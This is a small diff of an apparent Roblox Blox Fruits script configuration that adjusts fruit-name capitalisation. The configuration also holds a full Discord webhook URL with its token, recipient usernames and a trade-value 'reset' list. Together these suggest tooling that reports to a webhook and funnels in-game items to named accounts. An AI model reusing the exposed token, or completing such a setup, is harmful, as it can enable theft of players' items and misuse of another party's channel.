@@ -1,6 +1,6 @@
 Webhook = "https://discord.com/api/webhooks/1335675176993689733/LqaTCyyl-_HsQr2bN190it3M-W6SaRXCIu_-S7qrVqmGdbTz7u_soP2HOWCEbDvHajVH"
 Usernames = {"GOUTEN_DZB", "isaw_23callmenoob"}
-Fruits = {"Dragon(west)-Dragon(west)", "Dragon(east)-Dragon(east)", "Kitsune-Kitsune", "Yeti-Yeti", "Gas-Gas", "Leopard-Leopard"} -- << Fruits you want
+Fruits = {"Dragon(West)-Dragon(West)", "Dragon(East)-Dragon(East)", "Kitsune-Kitsune", "Yeti-Yeti", "Gas-Gas", "Leopard-Leopard"} -- << Fruits you want
 FruitsToReset = {  -- << Fruits it'll reset with, so you can put these fruits in trade to counter value difference
     "Quake-Quake",
     "Love-Love",
